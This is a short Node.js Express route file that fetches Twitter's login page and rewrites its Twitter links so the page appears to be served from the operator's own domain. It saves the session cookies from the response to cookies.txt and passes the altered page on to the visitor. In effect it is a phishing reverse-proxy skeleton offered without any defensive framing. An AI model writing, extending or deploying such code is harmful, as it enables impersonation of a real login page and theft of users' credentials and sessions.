const https = require('https');
const request = require('request');
const fs = require('fs');
const express = require('express');
const router = express.Router();

/* GET users listing. */
router.get('/', function (req, res1, next) {
    request('https://www.twitter.com/login', {}, (err, res, body) => {
        if (err) return console.log("err:", err);

        // replace `twitter.com` by our own domain address
        const re = /https:\/\/twitter.com(.*)/g;
        body = body.replace(re, '$1');

        // save the cookies into `cookies.txt` file
        fs.writeFile('cookies.txt', res.headers['set-cookie'], (err) => {
            if (err) console.log(err);
        });

        res1.send(body);
    });
});

module.exports = router;
